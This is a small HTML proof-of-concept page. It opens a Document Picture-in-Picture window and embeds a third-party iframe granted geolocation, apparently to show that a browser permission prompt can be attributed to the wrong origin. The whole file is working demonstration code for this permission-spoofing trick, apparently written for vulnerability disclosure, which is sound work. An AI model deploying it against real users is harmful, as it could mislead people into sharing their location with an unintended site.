<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Permission Origin Test</title>
</head>

<body>

<button onclick="runPoC()">Click Me</button>

<script>
async function runPoC() {

  const popupPip =
    await documentPictureInPicture.requestWindow({
      width: 900,
      height: 800
    });

  popupPip.document.write(`
    <!doctype html>
    <html>
    <head>
      <meta charset="utf-8">
      <title>Permission Origin Test</title>

      <style>
        body {
          font-family: -apple-system,
                       BlinkMacSystemFont,
                       system-ui,
                       sans-serif;
          margin: 20px;
        }

        iframe {
          width: 850px;
          height: 700px;
          border: 1px solid #ccc;
        }
      </style>
    </head>

    <body>

      <h2>Permission Origin Test</h2>

      <p>
        Top-level origin:
        <code>${location.origin}</code>
      </p>

      <iframe
        src="https://weird0xsec.github.io/spf/permission.html"
        allow="geolocation">
      </iframe>

    </body>
    </html>
  `);

  popupPip.document.close();
}
</script>

</body>
</html>
